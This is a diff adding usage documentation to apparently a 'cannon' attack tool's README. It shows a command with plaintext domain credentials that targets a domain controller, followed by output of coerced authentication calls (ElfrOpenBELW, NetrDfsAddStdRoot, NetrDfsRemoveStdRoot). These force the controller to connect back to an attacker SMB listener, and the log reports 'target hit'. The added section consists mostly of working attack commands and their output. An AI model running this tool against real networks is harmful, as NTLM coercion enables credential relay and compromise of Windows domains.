@@ -104,3 +104,34 @@ Server loop running in thread: Thread-2
  all jobs done,costs 5s exit after 5 seconds..
 
 ```
+
+指定rpc
+
+```text
+PS C:\> python.exe cannon/main.py -u jiayu -p SBxaVx#k2$1 -dc-ip 192.168.31.110 -listener 192.168.80.31 -rpcs even dfs 
+Server loop running in thread: Thread-2
+
+[*] 2 cannons loaded. fire!
+[*] target pipe is eventlog
+[*] [lock_and_load] success
+--------------------------------------------------
+[*]  shooting [192.168.31.110]ElfrOpenBELW(BackupFileName=\??\UNC\192.168.80.31\XTeam\h)
+[+] connection from 192.168.31.110:50670
+[+] connection from 192.168.31.110:50671
+[*] [+][_shoot] target hit! please check smb server.
+[*] target pipe is netdfs
+[*] [lock_and_load] success
+--------------------------------------------------
+[*]  shooting [192.168.31.110]NetrDfsAddStdRoot(ServerName=\\192.168.80.31\RETHp\file.txt)
+[+] connection from 192.168.31.110:50672
+[+] connection from 192.168.31.110:50673
+[*] [+][[_shoot] target hit! please check smb server.
+--------------------------------------------------
+[*]  shooting [192.168.31.110]NetrDfsRemoveStdRoot(ServerName=\\192.168.80.31\gPWLQ\file.txt)
+[+] connection from 192.168.31.110:50674
+[+] connection from 192.168.31.110:50675
+[*] [+][[_shoot] target hit! please check smb server.
+--------------------------------------------------
+[*]  all jobs done,costs 1s exit after 5 seconds..
+
+```
